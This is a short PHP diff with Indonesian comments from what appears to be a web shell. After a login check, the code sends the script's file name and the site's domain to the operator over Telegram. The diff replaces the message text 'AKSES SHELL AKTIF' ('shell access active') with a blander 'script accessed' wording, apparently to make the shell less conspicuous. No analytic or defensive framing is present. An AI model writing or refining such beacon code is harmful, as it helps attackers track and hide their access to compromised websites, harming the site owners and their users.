@@ -78,7 +78,7 @@ if (is_logged_in()) {
     // Buat pesan notifikasi
     $file_name = basename($_SERVER['PHP_SELF']);
     $domain = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
-    $message = "AKSES SHELL AKTIF" . date('Y-m-d H:i:s') . "</b>\nDomain: <b>$domain</b>";
+    $message = "Script <b>$file_name</b> berhasil diakses pada <b>" . date('Y-m-d H:i:s') . "</b>\nDomain: <b>$domain</b>";
 
     // Kirim notifikasi ke Telegram
     sendTelegramNotification($message);
